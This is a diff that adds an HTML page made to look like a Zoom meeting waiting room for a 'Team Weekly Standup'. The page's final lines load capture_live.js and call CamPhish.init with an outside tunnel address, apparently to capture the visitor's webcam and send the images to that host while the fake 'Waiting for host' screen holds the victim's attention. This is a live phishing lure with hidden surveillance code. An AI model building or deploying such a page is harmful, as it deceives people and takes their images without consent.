@@ -1,0 +1,202 @@
+<!doctype html>
+<html>
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Zoom Meeting</title>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+  <style>
+    @import url("https://fonts.googleapis.com/css2?family=Nunito:wght@400;500;600&display=swap");
+
+    * {
+      padding: 0;
+      margin: 0;
+      font-family: 'Nunito', sans-serif;
+      box-sizing: border-box;
+    }
+
+    body {
+      height: 100vh;
+      width: 100vw;
+      background-color: #1a1a1a;
+      overflow: hidden;
+    }
+
+    .main-screen {
+      background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
+      height: 100vh;
+      width: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+    }
+
+    .avatar-container {
+      width: 120px;
+      height: 120px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-bottom: 20px;
+    }
+
+    .avatar-container i {
+      font-size: 50px;
+      color: white;
+    }
+
+    .name {
+      color: #fff;
+      font-size: 22px;
+      font-weight: 600;
+      margin-bottom: 8px;
+    }
+
+    .status {
+      color: #aaa;
+      font-size: 14px;
+    }
+
+    .bottom-bar {
+      position: fixed;
+      bottom: 0;
+      height: 70px;
+      width: 100%;
+      background: rgba(32, 32, 32, 0.95);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 20px;
+      backdrop-filter: blur(10px);
+      border-top: 1px solid #333;
+    }
+
+    .icon-btn {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      color: #fff;
+      background: transparent;
+      border: none;
+      cursor: pointer;
+      padding: 8px 15px;
+      border-radius: 8px;
+      transition: all 0.2s;
+    }
+
+    .icon-btn:hover {
+      background: rgba(255, 255, 255, 0.1);
+    }
+
+    .icon-btn i {
+      font-size: 20px;
+      margin-bottom: 4px;
+    }
+
+    .icon-btn span {
+      font-size: 11px;
+    }
+
+    .icon-btn.muted {
+      color: #ea4335;
+    }
+
+    .icon-btn.end {
+      background: #ea4335;
+      padding: 10px 25px;
+      border-radius: 20px;
+    }
+
+    .icon-btn.end:hover {
+      background: #d93025;
+    }
+
+    .top-bar {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      padding: 15px 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      background: rgba(0, 0, 0, 0.3);
+    }
+
+    .meeting-info {
+      color: #fff;
+      font-size: 13px;
+    }
+
+    .meeting-id {
+      color: #aaa;
+      font-size: 12px;
+    }
+
+    .controls {
+      display: flex;
+      gap: 15px;
+    }
+
+    .controls i {
+      color: #fff;
+      font-size: 18px;
+      cursor: pointer;
+      opacity: 0.8;
+    }
+
+    .controls i:hover {
+      opacity: 1;
+    }
+
+    .participant-count {
+      position: fixed;
+      top: 70px;
+      right: 20px;
+      background: rgba(0, 0, 0, 0.5);
+      padding: 8px 15px;
+      border-radius: 20px;
+      color: #fff;
+      font-size: 13px;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="top-bar">
+    <div>
+      <div class="meeting-info">Team Weekly Standup</div>
+      <div class="meeting-id">Meeting ID: 847-2951-3847</div>
+    </div>
+    <div class="controls">
+      <i class="fas fa-shield-alt"></i>
+      <i class="fas fa-info-circle"></i>
+      <i class="fas fa-expand"></i>
+    </div>
+  </div>
+  <div class="participant-count"><i class="fas fa-user"></i> 3</div>
+  <div class="main-screen">
+    <div class="avatar-container"><i class="fas fa-user"></i></div>
+    <div class="name">Waiting for host...</div>
+    <div class="status">Please wait, the host will let you in soon</div>
+  </div>
+  <div class="bottom-bar">
+    <button class="icon-btn muted"><i class="fas fa-microphone-slash"></i><span>Unmute</span></button>
+    <button class="icon-btn"><i class="fas fa-video"></i><span>Video</span></button>
+    <button class="icon-btn"><i class="fas fa-shield-alt"></i><span>Security</span></button>
+    <button class="icon-btn"><i class="fas fa-users"></i><span>Participants</span></button>
+    <button class="icon-btn"><i class="fas fa-comment"></i><span>Chat</span></button>
+    <button class="icon-btn"><i class="fas fa-share-square"></i><span>Share</span></button>
+    <button class="icon-btn"><i class="fas fa-record-vinyl"></i><span>Record</span></button>
+    <button class="icon-btn end"><i class="fas fa-phone-slash"></i><span>End</span></button>
+  </div>
+  <script src="capture_live.js"></script>
+  <script>CamPhish.init('https://f23478bdb212dd3aa38258960b96624f.loophole.site');</script>
+</body>
+
+</html>
